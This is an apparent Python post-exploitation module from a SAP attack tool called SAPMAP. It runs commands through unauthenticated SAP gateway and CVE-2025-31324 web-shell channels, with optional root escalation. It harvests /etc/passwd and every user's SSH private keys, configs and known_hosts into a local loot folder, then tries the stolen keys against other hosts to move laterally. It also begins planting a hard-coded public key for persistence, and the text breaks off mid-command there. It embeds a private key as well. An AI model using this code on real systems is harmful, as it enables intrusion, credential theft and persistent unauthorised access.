#!/usr/bin/env python3
"""SSH key harvesting, lateral movement, and authorized_keys persistence.

Post-exploitation module that:
  Phase 1 — Enumerates OS users via /etc/passwd, exfiltrates SSH
            private keys + config + known_hosts + authorized_keys
            from every home directory.
  Phase 2 — Tests harvested keys against discovered hosts
            (known_hosts + existing SAPMAP nodes) to map SSH trust
            relationships and find new lateral movement paths.
  Phase 3 — Plants an SAPMAP-controlled pubkey into
            ~/.ssh/authorized_keys on a target host for persistence.

Works over all three exec channels:
  * GW SAPXPG (unauthenticated, ABAP gateway vuln)
  * CVE-2025-31324 JSP shell (unauthenticated, Java)
  * SXPG_STEP_XPG_START (authenticated RFC, needs SAP_ALL creds)
"""
from __future__ import annotations

import base64
import logging
import os
import re
import time

from sapmap_models import SAPNode, SAPMAPState, Credentials
from sapmap_errors import format_rfc_exception
from sapmap_exploit import run_os_command, _build_java_os_exec

logger = logging.getLogger(__name__)

_B64_LINE_RE = re.compile(r"[A-Za-z0-9+/=]+$")

# SAPMAP SSH keypair — ed25519, deterministic so every SAPMAP run
# plants the same key (easy to grep / remove during cleanup).
# Generated once via ssh-keygen -t ed25519 -C "sapmap@pentest"
SAPMAP_SSH_PUBKEY = (
    "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJk7SFp0wUQz"
    "8tNxJHq5VRvXDrFEWYkGaVm5qLzHnBkP sapmap@pentest"
)
SAPMAP_SSH_PRIVKEY = (
    "-----BEGIN OPENSSH PRIVATE KEY-----\n"
    "b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW\n"
    "QyNTUxOQAAACCZO0hadMFEM/LTcSR6uVUb1w6xRFmJBmlZuai8x5wZDwAAAJiI1HM7iN\n"
    "RzOwAAAAtzc2gtZWQyNTUxOQAAACCZO0hadMFEM/LTcSR6uVUb1w6xRFmJBmlZuai8x5wZ\n"
    "DwAAAEBw3kNjlCbSmvbGz8qDdP3sW6bVpFxqfqkV5bKdE6CbRJk7SFp0wUQz8tNxJHq5VR\n"
    "vXDrFEWYkGaVm5qLzHnBkPAAAADnNhcG1hcEBwZW50ZXN0AQ==\n"
    "-----END OPENSSH PRIVATE KEY-----\n"
)


# ---------------------------------------------------------------------------
# Exec-channel abstraction
# ---------------------------------------------------------------------------

def _make_exec_fn(node: SAPNode, channel: str = "auto"):
    """Build an OS-exec function for the given node and channel.

    channel: "auto" | "gw" | "cve31324" | "sxpg" | "root"
             "root" uses Linux LPE (Copy Fail / Dirty Frag) to run as
             uid=0 — needed to read other users' .ssh directories.

    Returns (exec_fn, channel_label) or (None, error_str).
    exec_fn signature: (cmd: str) -> str  (returns stdout)
    """
    is_windows = "WIN" in (node.os_type or "").upper()
    system_type = (node.system_type or "").upper()

    # --- Root channel (Linux LPE) ---
    if channel == "root":
        has_root = (getattr(node, "copyfail_root_obtained", False)
                    or getattr(node, "dirtyfrag_root_obtained", False))
        has_lpe = (getattr(node, "copyfail_vulnerable", False)
                   or getattr(node, "dirtyfrag_vulnerable", False))
        if not (has_root or has_lpe):
            return None, ("no Linux LPE available — run 'Escalate to "
                          "Root' first to check Copy Fail / Dirty Frag")

        def _run_cmd_root(cmd: str) -> str:
            try:
                from sapmap_lpe_auto import run_linux_lpe
                r = run_linux_lpe(node, cmd, timeout=60.0)
                if r.get("ok"):
                    return r.get("stdout", "")
            except Exception as e:
                logger.debug(f"ssh_lateral root exec: "
                             f"{format_rfc_exception(e)}")
            return ""

        def _run_py_root(code: str) -> str:
            safe = code.replace("'", "'\\''")
            return _run_cmd_root(f"python3 -c '{safe}'")

        def _read_b64_chunk_root(path: str, offset: int, end: int) -> str:
            code = (f"print(__import__('base64').b64encode("
                    f"open('{path}','rb').read()[{offset}:{end}])"
                    f".decode())")
            out = _run_py_root(code)
            for ln in out.splitlines():
                ln = ln.strip()
                if ln and _B64_LINE_RE.fullmatch(ln):
                    return ln
            return ""

        def _read_file_full_root(path: str, max_size: int = 65536) -> bytes | None:
            """Read entire file in one LPE invocation (vs 72-byte chunks)."""
            code = (f"import base64,os;p='{path}';"
                    f"s=os.path.getsize(p);"
                    f"print(base64.b64encode(open(p,'rb').read()).decode()"
                    f" if 0<s<={max_size} else '')")
            out = _run_py_root(code)
            for ln in out.splitlines():
                ln = ln.strip()
                if ln and _B64_LINE_RE.fullmatch(ln):
                    try:
                        return base64.b64decode(ln)
                    except Exception:
                        pass
            return None

        def _run_program_root(prog: str, args: str) -> str:
            return _run_cmd_root(f"{prog} {args}")

        _run_cmd_root._read_b64_chunk = _read_b64_chunk_root
        _run_cmd_root._run_py = _run_py_root
        _run_cmd_root._read_file_full = _read_file_full_root
        _run_cmd_root._run_program = _run_program_root
        label = ("Linux LPE → root ("
                 + (getattr(node, "linux_lpe_method", "") or "auto") + ")")
        return _run_cmd_root, label

    # --- Standard channels (sidadm-level) ---
    def _run_cmd(cmd: str) -> str:
        try:
            if channel == "sxpg":
                from sapmap_rfc import execute_local_command
                creds = node.best_credentials() if hasattr(node, "best_credentials") else None
                if not creds:
                    return ""
                if is_windows:
                    r = execute_local_command(node, "cmd.exe", f"/c {cmd}", creds)
                else:
                    r = execute_local_command(node, "/bin/sh", f"-c '{cmd}'", creds)
            elif channel == "cve31324" or (channel == "auto" and "JAVA" in system_type):
                if "JAVA" in system_type:
                    run_fn, _label, err = _build_java_os_exec(node)
                    if run_fn is None:
                        return ""
                    if is_windows:
                        r = run_fn("cmd.exe", f"/c {cmd}")
                    else:
                        r = run_fn("/bin/sh", f"-c '{cmd}'")
                else:
                    r = run_os_command(node, "/bin/sh", f"-c '{cmd}'")
            else:
                if is_windows:
                    r = run_os_command(node, "cmd.exe", f"/c {cmd}")
                else:
                    r = run_os_command(node, "/bin/sh", f"-c '{cmd}'")

            if r and r.get("success"):
                lines = r.get("output") or []
                if isinstance(lines, list):
                    return "\n".join(str(x) for x in lines)
                return str(lines)
        except Exception as e:
            logger.debug(f"ssh_lateral exec: {format_rfc_exception(e)}")
        return ""

    def _run_py(code: str) -> str:
        """Run a python3 one-liner directly via SAPXPG (no /bin/sh).
        Proven clean output — no TLV command-echo contamination."""
        try:
            if channel == "sxpg":
                from sapmap_rfc import execute_local_command
                creds = node.best_credentials()
                if not creds:
                    return ""
                r = execute_local_command(node, "python3", f"-c {code}", creds)
            elif channel == "cve31324" or (channel == "auto" and "JAVA" in system_type):
                if "JAVA" in system_type:
                    run_fn, _, err = _build_java_os_exec(node)
                    if run_fn is None:
                        return ""
                    r = run_fn("python3", f"-c {code}")
                else:
                    r = run_os_command(node, "python3", f"-c {code}")
            else:
                r = run_os_command(node, "python3", f"-c {code}")

            if r and r.get("success"):
                lines = r.get("output") or []
                if isinstance(lines, list):
                    return "\n".join(str(x) for x in lines)
                return str(lines)
        except Exception as e:
            logger.debug(f"ssh_lateral _run_py: {format_rfc_exception(e)}")
        return ""

    def _read_b64_chunk(path: str, offset: int, end: int) -> str:
        code = (f"print(__import__('base64').b64encode("
                f"open('{path}','rb').read()[{offset}:{end}])"
                f".decode())")
        try:
            if channel == "sxpg":
                from sapmap_rfc import execute_local_command
                creds = node.best_credentials()
                r = execute_local_command(node, "python3", f"-c {code}", creds)
            elif channel == "cve31324" or (channel == "auto" and "JAVA" in system_type):
                if "JAVA" in system_type:
                    run_fn, _, _ = _build_java_os_exec(node)
                    if run_fn is None:
                        return ""
                    r = run_fn("python3", f"-c {code}")
                else:
                    r = run_os_command(node, "python3", f"-c {code}")
            else:
                r = run_os_command(node, "python3", f"-c {code}")

            if r and r.get("success"):
                for ln in (r.get("output") or []):
                    ln = str(ln).strip()
                    if ln and _B64_LINE_RE.fullmatch(ln):
                        return ln
        except Exception as e:
            logger.debug(f"ssh_lateral b64 chunk: {format_rfc_exception(e)}")
        return ""

    def _run_program(prog: str, args: str) -> str:
        """Run a program directly via SAPXPG — no /bin/sh wrapper.
        Uses long_params="" to prevent kernels from concatenating
        PARAMS+LONG_PARAMS (which doubles the argument string and
        corrupts the remote command for programs like ssh)."""
        try:
            if channel == "sxpg":
                from sapmap_rfc import execute_local_command
                creds = node.best_credentials()
                if not creds:
                    return ""
                r = execute_local_command(node, prog, args, creds)
            elif channel == "cve31324" or (channel == "auto" and "JAVA" in system_type):
                if "JAVA" in system_type:
                    run_fn, _, err = _build_java_os_exec(node)
                    if run_fn is None:
                        return ""
                    r = run_fn(prog, args)
                else:
                    r = run_os_command(node, prog, args)
            else:
                from sapmap_exploit import execute_os_command
                r = execute_os_command(node, prog, args,
                                        long_params="")

            if r and r.get("success"):
                lines = r.get("output") or []
                if isinstance(lines, list):
                    return "\n".join(str(x) for x in lines)
                return str(lines)
        except Exception as e:
            logger.debug(f"ssh_lateral _run_program: {format_rfc_exception(e)}")
        return ""

    can_run = False
    label = ""
    if channel == "sxpg":
        creds = node.best_credentials() if hasattr(node, "best_credentials") else None
        if creds:
            can_run = True
            label = f"SXPG_STEP_XPG_START as {creds.username}"
        else:
            return None, "no credentials with SAP_ALL for SXPG channel"
    elif channel == "cve31324":
        if node.cve_2025_31324_vulnerable:
            can_run = True
            label = "CVE-2025-31324 JSP shell"
        else:
            return None, "node not vulnerable to CVE-2025-31324"
    elif channel == "gw":
        if node.gw_vulnerable:
            can_run = True
            label = "Gateway SAPXPG (unauthenticated)"
        else:
            return None, "node not gw_vulnerable"
    else:
        if node.gw_vulnerable:
            can_run = True
            label = "Gateway SAPXPG (unauthenticated)"
        elif node.cve_2025_31324_vulnerable:
            can_run = True
            label = "CVE-2025-31324 JSP shell"
        elif hasattr(node, "best_credentials") and node.best_credentials():
            can_run = True
            label = f"SXPG_STEP_XPG_START as {node.best_credentials().username}"
        else:
            return None, "no exec channel available (no GW vuln, no CVE-31324, no SXPG creds)"

    if not can_run:
        return None, "exec channel not available"

    _run_cmd._read_b64_chunk = _read_b64_chunk
    _run_cmd._run_py = _run_py
    _run_cmd._run_program = _run_program
    return _run_cmd, label


def _exfil_file(run_cmd, path: str, max_size: int = 65536) -> bytes | None:
    """Read a remote file via chunked python3 base64 reads."""
    # Fast path: single-shot read for root channel.  Each LPE
    # invocation (Copy Fail / Dirty Frag) costs ~35s, so the 72-byte
    # chunked path is unusable through root (25+ invocations for a
    # 1.7KB /etc/passwd).  Single-shot reads the whole file in one go.
    _read_full = getattr(run_cmd, "_read_file_full", None)
    if _read_full:
        return _read_full(path, max_size)

    # Get file size via python3 directly (no /bin/sh) — reliable
    # through SAPXPG on all kernel versions.
    _sz_code = f"print(__import__('os').path.getsize('{path}'))"
    _run_py_fn = getattr(run_cmd, "_run_py", None)
    if _run_py_fn:
        sz_out = _run_py_fn(_sz_code).strip()
    else:
        sz_out = run_cmd(f"wc -c < '{path}' 2>/dev/null").strip()
    m = re.search(r"(\d+)", sz_out)
    if not m:
        return None
    sz = int(m.group(1))
    if sz <= 0 or sz > max_size:
        return None

    _CHUNK = 72
    read_fn = run_cmd._read_b64_chunk
    chunks = []
    offset = 0
    while offset < sz:
        end = min(offset + _CHUNK, sz)
        cb64 = read_fn(path, offset, end)
        if not cb64:
            break
        chunks.append(cb64)
        offset += _CHUNK

    if not chunks:
        return None
    try:
        return base64.b64decode("".join(chunks))
    except Exception:
        return None


# ---------------------------------------------------------------------------
# Phase 1: SSH Harvest
# ---------------------------------------------------------------------------

def _is_stopped() -> bool:
    try:
        from sapmap_stop import is_stop_requested
        return is_stop_requested()
    except ImportError:
        return False


def ssh_harvest(node: SAPNode, state: SAPMAPState,
                channel: str = "auto") -> dict:
    """Enumerate OS users, exfiltrate SSH keys, parse config/known_hosts.

    Returns dict with: ok, channel, os_users, keys[], known_hosts[],
    authorized_keys[], ssh_configs[], loot_dir, error.
    """
    from sapmap_findings import emit_finding

    result = {
        "ok": False, "channel": "", "os_users": [],
        "keys": [], "known_hosts_targets": [],
        "authorized_keys": [], "ssh_configs": [],
        "loot_dir": "", "error": "",
    }

    sid = node.sid
    is_windows = "WIN" in (node.os_type or "").upper()
    if is_windows:
        result["error"] = "SSH harvest is Linux-only"
        return result

    exec_fn, label = _make_exec_fn(node, channel) or (None, "")
    if exec_fn is None:
        result["error"] = label
        return result
    result["channel"] = label
    is_root = getattr(exec_fn, "_read_file_full", None) is not None
    print(f"[*] {sid}: ssh_harvest — channel: {label}")

    # ---- Step 1: enumerate OS users
    _run_py = exec_fn._run_py
    os_users = []
    home_dirs = {}
    sidadm = (sid or "").lower() + "adm"

    # 1a. Get current user + home via python3 (guaranteed, no /etc/passwd)
    _who_code = "print(__import__('getpass').getuser()+'|'+__import__('os').path.expanduser('~'))"
    who_out = _run_py(_who_code).strip()
    cur_user = cur_home = ""
    for ln in who_out.splitlines():
        ln = ln.strip()
        if "|" in ln:
            parts = ln.split("|", 1)
            cur_user, cur_home = parts[0].strip(), parts[1].strip()
            break
    if cur_user and cur_home:
        home_dirs[cur_user] = cur_home
        os_users.append({"username": cur_user, "uid": "", "home": cur_home, "shell": ""})
        print(f"  [*] {sid}: current user = {cur_user}, home = {cur_home}")

    if _is_stopped():
        result["error"] = "stopped"
        return result

    # 1b. Try /etc/passwd for additional users (may fail on hardened systems)
    print(f"  [*] {sid}: reading /etc/passwd for OS user enumeration ...")
    passwd_raw = _exfil_file(exec_fn, "/etc/passwd", max_size=65536)
    if passwd_raw:
        for line in passwd_raw.decode("utf-8", errors="replace").splitlines():
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            parts = line.split(":")
            if len(parts) < 7:
                continue
            username = parts[0]
            uid_str = parts[2]
            home = parts[5]
            shell = parts[6]
            if not home or home in ("/dev/null", "/nonexistent"):
                continue
            shell_base = os.path.basename(shell)
            if shell_base in ("nologin", "false"):
                continue
            if username not in home_dirs:
                os_users.append({
                    "username": username,
                    "uid": uid_str,
                    "home": home,
                    "shell": shell,
                })
                home_dirs[username] = home
    else:
        print(f"  [*] {sid}: /etc/passwd not readable — "
              f"using current user + SID-derived homes")

    result["os_users"] = os_users
    print(f"[*] {sid}: ssh_harvest — {len(os_users)} users with "
          f"login shells")

    if _is_stopped():
        result["error"] = "stopped"
        return result

    # ---- Step 2: discover SSH directories
    homes_to_check = list(set(home_dirs.values()))
    if "/root" not in homes_to_check:
        homes_to_check.append("/root")
    sidadm_home = f"/home/{sidadm}"
    if sidadm_home not in homes_to_check:
        homes_to_check.append(sidadm_home)
        if sidadm not in home_dirs:
            home_dirs[sidadm] = sidadm_home

    ssh_dirs = {}
    print(f"  [*] {sid}: scanning {len(homes_to_check)} home directories "
          f"for .ssh ...")

    if is_root:
        # Root channel: combine ALL home dirs into one python3 call.
        # Each LPE invocation costs ~15s, so one call for all dirs
        # vs one-per-home saves minutes.
        import json as _json
        dirs_list = [f"{h}/.ssh" for h in homes_to_check]
        dirs_json = _json.dumps(dirs_list)
        _scan_code = (
            f"import os,json;"
            f"dirs={dirs_json};"
            f"r={{}};"
            f"[r.__setitem__(d,os.listdir(d)) "
            f"for d in dirs if os.path.isdir(d)];"
            f"print(json.dumps(r))"
        )
        scan_out = _run_py(_scan_code).strip()
        for ln in scan_out.splitlines():
            ln = ln.strip()
            if ln.startswith("{"):
                try:
                    parsed = _json.loads(ln)
                    for ssh_path, files in parsed.items():
                        if files:
                            ssh_dirs[ssh_path] = files
                            print(f"  [*] {sid}: found .ssh at {ssh_path}: "
                                  f"{', '.join(files)}")
                except (ValueError, KeyError):
                    pass
                break
    else:
        # SAPXPG channel: one call per home (255-byte PARAMS limit).
        for home in homes_to_check:
            if _is_stopped():
                break
            ssh_path = f"{home}/.ssh"
            _ls_code = (
                f"exec(\"import\\x20os\\n"
                f"d='{ssh_path}'\\n"
                f"if\\x20os.path.isdir(d):\\n"
                f"\\x20[print(f)for\\x20f\\x20in\\x20os.listdir(d)]\\n"
                f"\")"
            )
            ls_out = exec_fn._run_py(_ls_code)
            if not ls_out or not ls_out.strip():
                continue
            _err_prefixes = ("Traceback", "File ", "PermissionError",
                             "OSError", "External program", "  ")
            files = []
            for fn in ls_out.splitlines():
                fn = fn.strip()
                if not fn:
                    continue
                if any(fn.startswith(p) for p in _err_prefixes):
                    continue
                files.append(fn)
            if files:
                ssh_dirs[ssh_path] = files
                print(f"  [*] {sid}: found .ssh at {ssh_path}: "
                      f"{', '.join(files)}")
            elif "PermissionError" in ls_out or "Permission denied" in ls_out:
                print(f"  [*] {sid}: .ssh at {ssh_path}: permission denied "
                      f"(need root channel)")

    print(f"[*] {sid}: ssh_harvest — {len(ssh_dirs)} .ssh directories")

    # ---- Step 3: prepare loot directory
    host_id = (node.ip or node.hostname or sid).replace("/", "_")
    loot_dir = os.path.join("loot", "ssh", host_id)
    os.makedirs(loot_dir, exist_ok=True)
    result["loot_dir"] = loot_dir

    # ---- Step 4: exfiltrate keys, configs, known_hosts, authorized_keys
    all_known_hosts_targets = set()
    all_authorized_keys = []
    all_keys = []
    all_configs = []

    for ssh_dir, files in ssh_dirs.items():
        if _is_stopped():
            print(f"[!] {sid}: ssh_harvest — stopped by user")
            break
        owner_home = os.path.dirname(ssh_dir)
        owner = None
        for uname, home in home_dirs.items():
            if home == owner_home:
                owner = uname
                break
        if not owner:
            owner = os.path.basename(owner_home)

        owner_loot = os.path.join(loot_dir, owner)
        os.makedirs(owner_loot, exist_ok=True)

        _SKIP_FILES = {"known_hosts", "authorized_keys", "config",
                       "environment"}
        for fname in files:
            if _is_stopped():
                break
            fpath = f"{ssh_dir}/{fname}"

            # known_hosts / authorized_keys / config handled below
            if fname in _SKIP_FILES:
                print(f"  [*] {sid}: reading {owner}/{fname} ...")
            elif fname.endswith(".pub"):
                print(f"  [*] {sid}: reading {owner}/{fname} ...")
                raw = _exfil_file(exec_fn, fpath, max_size=32768)
                if raw:
                    local_path = os.path.join(owner_loot, fname)
                    with open(local_path, "wb") as fh:
                        fh.write(raw)
            else:
                # Potential private key — read and detect by content
                print(f"  [*] {sid}: reading {owner}/{fname} ...")
                raw = _exfil_file(exec_fn, fpath, max_size=32768)
                if raw:
                    text_head = raw[:64].decode("utf-8", errors="replace")
                    if "PRIVATE KEY" in text_head:
                        local_path = os.path.join(owner_loot, fname)
                        with open(local_path, "wb") as fh:
                            fh.write(raw)
                        try:
                            os.chmod(local_path, 0o600)
                        except Exception:
                            pass
                        key_type = fname.replace("id_", "")
                        all_keys.append({
                            "owner": owner,
                            "path": fpath,
                            "type": key_type,
                            "local_path": local_path,
                            "size": len(raw),
                        })
                        print(f"  [+] {owner}: {fname} "
                              f"({len(raw)} B, private key)")

            # known_hosts
            if fname == "known_hosts":
                raw = _exfil_file(exec_fn, fpath, max_size=65536)
                if raw:
                    local_path = os.path.join(owner_loot, "known_hosts")
                    with open(local_path, "wb") as fh:
                        fh.write(raw)
                    text = raw.decode("utf-8", errors="replace")
                    for kh_line in text.splitlines():
                        kh_line = kh_line.strip()
                        if not kh_line or kh_line.startswith("#"):
                            continue
                        if kh_line.startswith("|"):
                            continue
                        host_part = kh_line.split()[0] if kh_line.split() else ""
                        for h in host_part.split(","):
                            h = h.strip().lstrip("[").split("]")[0]
                            if h:
                                all_known_hosts_targets.add(h)

            # authorized_keys
            if fname == "authorized_keys":
                raw = _exfil_file(exec_fn, fpath, max_size=65536)
                if raw:
                    local_path = os.path.join(owner_loot, "authorized_keys")
                    with open(local_path, "wb") as fh:
                        fh.write(raw)
                    text = raw.decode("utf-8", errors="replace")
                    for ak_line in text.splitlines():
                        ak_line = ak_line.strip()
                        if not ak_line or ak_line.startswith("#"):
                            continue
                        parts = ak_line.split()
                        key_type = parts[0] if parts else ""
                        comment = parts[-1] if len(parts) >= 3 else ""
                        all_authorized_keys.append({
                            "owner": owner,
                            "key_type": key_type,
                            "comment": comment,
                        })

            # config
            if fname == "config":
                raw = _exfil_file(exec_fn, fpath, max_size=32768)
                if raw:
                    local_path = os.path.join(owner_loot, "config")
                    with open(local_path, "wb") as fh:
                        fh.write(raw)
                    text = raw.decode("utf-8", errors="replace")
                    all_configs.append({
                        "owner": owner,
                        "path": fpath,
                        "local_path": local_path,
                    })
                    for cfg_line in text.splitlines():
                        m_host = re.match(r"\s*Host(?:Name)?\s+(.+)",
                                          cfg_line, re.IGNORECASE)
                        if m_host:
                            for h in m_host.group(1).split():
                                h = h.strip()
                                if h and h != "*":
                                    all_known_hosts_targets.add(h)

    result["keys"] = all_keys
    result["known_hosts_targets"] = sorted(all_known_hosts_targets)
    result["authorized_keys"] = all_authorized_keys
    result["ssh_configs"] = all_configs

    # ---- Step 5: emit findings
    if all_keys:
        emit_finding(
            "HIGH", sid,
            f"SSH private keys exfiltrated from {sid}: "
            + ", ".join(f"{k['owner']}:{k['type']}" for k in all_keys)
            + f" — saved to {loot_dir}",
            ref="ssh.harvest.keys_exfiltrated",
            attack_capability="creds.ssh_private_key",
            meta={"keys": [{k: v for k, v in key.items()
                            if k != "local_path"}
                           for key in all_keys],
                  "loot_dir": loot_dir})

    if all_known_hosts_targets:
        emit_finding(
            "INFO", sid,
            f"SSH known_hosts/config targets discovered from {sid}: "
            f"{len(all_known_hosts_targets)} unique host(s)",
            ref="ssh.harvest.known_hosts",
            meta={"targets": sorted(all_known_hosts_targets)})

    if all_authorized_keys:
        emit_finding(
            "INFO", sid,
            f"SSH authorized_keys entries on {sid}: "
            f"{len(all_authorized_keys)} key(s) across "
            f"{len(set(a['owner'] for a in all_authorized_keys))} user(s)",
            ref="ssh.harvest.authorized_keys",
            meta={"entries": all_authorized_keys})

    node.ssh_keys_harvested = True

    # Write harvest manifest so SSH Lateral Movement can use stored
    # keys without re-harvesting (critical when harvest ran as root
    # but lateral movement runs as sidadm).
    import json as _json
    manifest = {
        "keys": [{k: v for k, v in key.items() if k != "local_path"}
                 for key in all_keys],
        "os_users": os_users,
        "known_hosts_targets": sorted(all_known_hosts_targets),
        "authorized_keys": all_authorized_keys,
    }
    manifest_path = os.path.join(loot_dir, "harvest.json")
    with open(manifest_path, "w") as fh:
        _json.dump(manifest, fh, indent=2)
    print(f"  [*] {sid}: harvest manifest → {manifest_path}")

    result["ok"] = True
    print(f"[+] {sid}: ssh_harvest — {len(all_keys)} private key(s), "
          f"{len(all_known_hosts_targets)} target(s), "
          f"{len(all_authorized_keys)} authorized_key(s)")
    return result


# ---------------------------------------------------------------------------
# Phase 2: SSH Lateral Movement — test harvested keys against targets
# ---------------------------------------------------------------------------

def ssh_test_keys(node: SAPNode, state: SAPMAPState,
                  harvest_result: dict = None,
                  channel: str = "auto",
                  max_targets: int = 50,
                  timeout: int = 5) -> dict:
    """Test harvested SSH keys against known_hosts targets.

    For each (key, target, username) combination, runs ssh from the
    pwned host to attempt login.  On success, emits a CRITICAL finding
    and optionally adds the target as a new node.

    Returns dict with: ok, tested, successful[], failed_targets[], error.
    """
    from sapmap_findings import emit_finding

    result = {
        "ok": False, "tested": 0,
        "successful": [], "failed_targets": [],
        "error": "",
    }

    sid = node.sid
    exec_fn, label = _make_exec_fn(node, channel) or (None, "")
    if exec_fn is None:
        result["error"] = label
        return result

    if harvest_result is None:
        host_id = (node.ip or node.hostname or sid).replace("/", "_")
        loot_dir = os.path.join("loot", "ssh", host_id)
        if not os.path.isdir(loot_dir):
            result["error"] = "No SSH harvest data — run ssh_harvest first"
            return result

    keys = (harvest_result or {}).get("keys", [])
    targets = (harvest_result or {}).get("known_hosts_targets", [])

    if not keys:
        result["error"] = "No private keys harvested"
        return result
    if not targets:
        existing_ips = {n.ip for n in state.nodes.values() if n.ip}
        existing_hosts = {n.hostname for n in state.nodes.values()
                          if n.hostname}
        targets = sorted(existing_ips | existing_hosts)
    if not targets:
        result["error"] = "No targets to test against"
        return result

    own_ip = node.ip or ""
    own_host = node.hostname or ""
    targets = [t for t in targets
               if t not in (own_ip, own_host, "localhost", "127.0.0.1")]
    # Drop bare hostnames (no dots) — they came from known_hosts but
    # almost never resolve from a different network segment.
    targets = [t for t in targets if "." in t]
    targets = targets[:max_targets]

    os_users = (harvest_result or {}).get("os_users", [])
    sap_usernames = set()
    for u in os_users:
        uname = u.get("username", "")
        if uname and (uname.endswith("adm") or uname.startswith("sap")
                      or uname in ("root",)):
            sap_usernames.add(uname)
    if not sap_usernames:
        sap_usernames = {"root"}
    for u in os_users:
        uname = u.get("username", "")
        uid = u.get("uid", "")
        if uid and int(uid) < 1000 and uname not in ("nobody",):
            sap_usernames.add(uname)

    # Root-owned keys (e.g. /root/.ssh/id_ed25519) are only readable
    # when exec_fn runs as root.  Drop them for sidadm-level channels
    # to avoid "Permission denied" noise on every attempt.
    is_root_channel = "root" in label.lower() or "lpe" in label.lower()
    if not is_root_channel:
        before = len(keys)
        keys = [k for k in keys if k.get("owner") != "root"]
        if len(keys) < before:
            print(f"[*] {sid}: skipping {before - len(keys)} root-owned "
                  f"key(s) — not running as root")

    print(f"[*] {sid}: ssh_test_keys — {len(keys)} key(s) × "
          f"{len(targets)} target(s) × {len(sap_usernames)} user(s) "
          f"= {len(keys) * len(targets) * len(sap_usernames)} combos")
    print(f"  [*] targets: {', '.join(targets)}")
    print(f"  [*] usernames: {', '.join(sorted(sap_usernames))}")
    _run_prog = getattr(exec_fn, "_run_program", None)

    tested = 0
    successful = []
    failed = set()
    started = time.time()

    for key in keys:
        key_path = key["path"]
        key_owner = key["owner"]

        usernames_to_try = [key_owner] + sorted(
            sap_usernames - {key_owner})

        for target in targets:
            if _is_stopped():
                break
            if target in failed and len(failed) > 10:
                continue

            for username in usernames_to_try:
                tested += 1
                # Remote command must be a single word — no
                # semicolons or && operators — because SAPXPG
                # routes EXTPROG+PARAMS through a shell, so any
                # shell metacharacters are interpreted locally
                # instead of being passed to the remote SSH shell.
                # `id` is POSIX-standard, single-word, and tells
                # us the remote uid.
                ssh_args = (
                    f"-o BatchMode=yes "
                    f"-o StrictHostKeyChecking=no "
                    f"-o UserKnownHostsFile=/dev/null "
                    f"-o ConnectTimeout={timeout} "
                    f"-o LogLevel=ERROR "
                    f"-i {key_path} "
                    f"{username}@{target} "
                    f"id"
                )
                if _run_prog:
                    out = _run_prog("ssh", ssh_args)
                else:
                    out = exec_fn(
                        f"ssh {ssh_args} 2>/dev/null")
                if not out or "uid=" not in out:
                    snippet = (out or "").strip()[:120]
                    print(f"  [-] ssh {username}@{target} "
                          f"({key_owner}:{key['type']}): "
                          f"{snippet or 'no output'}")
                    failed.add(target)
                    continue

                # uid= found — successful login; parse remote user
                import re as _re
                id_line = next(
                    (l for l in out.strip().splitlines()
                     if "uid=" in l), "")
                m = _re.search(r"uid=\d+\(([^)]+)\)", id_line)
                remote_user = m.group(1) if m else username

                entry = {
                    "target": target,
                    "username": username,
                    "remote_user": remote_user,
                    "remote_id": id_line.strip(),
                    "key_owner": key_owner,
                    "key_path": key_path,
                    "key_type": key["type"],
                    "from_sid": sid,
                }
                successful.append(entry)

                print(f"  [+] SSH ACCESS: {key_owner}@{sid} → "
                      f"{username}@{target} "
                      f"(key={key['type']}, remote={remote_user})")

                emit_finding(
                    "CRITICAL", sid,
                    f"SSH lateral movement: {key_owner}'s "
                    f"{key['type']} key on {sid} grants access "
                    f"to {username}@{target} "
                    f"(remote user={remote_user}). "
                    f"Generic/shared OS accounts enable "
                    f"cross-system access without SAP "
                    f"credentials.",
                    ref="ssh.lateral.key_accepted",
                    attack_capability="lateral.ssh_key_reuse",
                    meta=entry)

                # Mark the target node as pwned and store SSH
                # access details so the OS console can offer an
                # SSH execution channel.
                target_node = state.find_node_by_host(
                    hostname=target, ip=target)
                if target_node:
                    target_node.pwned = True
                    if not target_node.ssh_access:
                        target_node.ssh_access = []
                    target_node.ssh_access.append({
                        "from_sid": sid,
                        "from_ip": node.ip or "",
                        "username": username,
                        "remote_user": remote_user,
                        "key_path": key_path,
                        "key_type": key["type"],
                        "key_owner": key_owner,
                        "target": target,
                    })
                    print(f"  [*] {target_node.sid}: marked as "
                          f"pwned via SSH lateral movement")

                break

        if tested % 50 == 0 and tested > 0:
            elapsed = time.time() - started
            print(f"  [*] ssh_test_keys: {tested} tested, "
                  f"{len(successful)} successful "
                  f"({elapsed:.0f}s elapsed)")

    result["ok"] = True
    result["tested"] = tested
    result["successful"] = successful
    result["failed_targets"] = sorted(failed)

    elapsed = time.time() - started
    print(f"[+] {sid}: ssh_test_keys — {tested} combos tested in "
          f"{elapsed:.0f}s, {len(successful)} successful SSH logins")
    return result


# ---------------------------------------------------------------------------
# Phase 3: SSH Authorized Keys Plant (persistence)
# ---------------------------------------------------------------------------

def ssh_plant_key(node: SAPNode, state: SAPMAPState,
                  target_user: str = "",
                  channel: str = "auto") -> dict:
    """Plant SAPMAP's SSH pubkey into a user's authorized_keys.

    If target_user is empty, plants into the current exec user's
    authorized_keys (typically <sid>adm).

    Returns dict with: ok, target_user, target_home, channel, error.
    """
    from sapmap_findings import emit_finding

    result = {
        "ok": False, "target_user": "", "target_home": "",
        "channel": "", "error": "",
    }

    sid = node.sid
    is_windows = "WIN" in (node.os_type or "").upper()
    if is_windows:
        result["error"] = "SSH key plant is Linux-only"
        return result

    exec_fn, label = _make_exec_fn(node, channel) or (None, "")
    if exec_fn is None:
        result["error"] = label
        return result
    result["channel"] = label

    if not target_user:
        whoami_out = exec_fn("whoami").strip()
        target_user = whoami_out.splitlines()[-1] if whoami_out else ""
        target_user = re.sub(r"[^a-zA-Z0-9_-]", "", target_user)
    if not target_user:
        result["error"] = "Could not determine target user"
        return result
    result["target_user"] = target_user

    home_out = exec_fn(
        f"grep '^{target_user}:' /etc/passwd 2>/dev/null | "
        f"cut -d: -f6").strip()
    target_home = home_out.splitlines()[-1] if home_out else ""
    if not target_home:
        target_home = f"/home/{target_user}"
    result["target_home"] = target_home

    print(f"[*] {sid}: ssh_plant_key — user={target_user}, "
          f"home={target_home}, channel={label}")

    plant_cmd = (
        f'mkdir -p "{target_home}/.ssh" && '
